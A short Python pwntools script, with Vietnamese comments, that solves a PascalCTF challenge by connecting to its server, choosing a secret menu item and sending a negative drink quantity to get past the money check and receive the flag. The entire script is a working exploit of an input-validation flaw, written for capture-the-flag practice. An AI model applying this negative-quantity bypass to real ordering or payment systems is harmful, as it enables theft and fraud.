from pwn import *

def solve():
    # Kết nối (mình dùng process để minh họa logic, bạn đổi thành remote nhé)
    conn = remote('malta.ctf.pascalctf.it', 9001)
    # conn = process('./malta', env={'FLAG': 'PascalCTF{fake_flag_for_test}'})

    # Chờ menu hiện ra
    print(conn.recvuntil(b'Select a drink: ').decode())

    # Bước 1: Chọn món số 10 (Secret challenge)
    conn.sendline(b'10')
    print(">> Sent: 10")

    # Chờ hỏi số lượng
    print(conn.recvuntil(b'How many drinks do you want? ').decode())

    # Bước 2: Nhập số lượng âm để bypass kiểm tra tiền
    conn.sendline(b'-1')
    print(">> Sent: -1")

    # Bước 3: Nhận Flag
    # Flag sẽ nằm trong phần mô tả ("Description") của hóa đơn
    response = conn.recvall().decode()
    print(response)

if __name__ == "__main__":
    solve()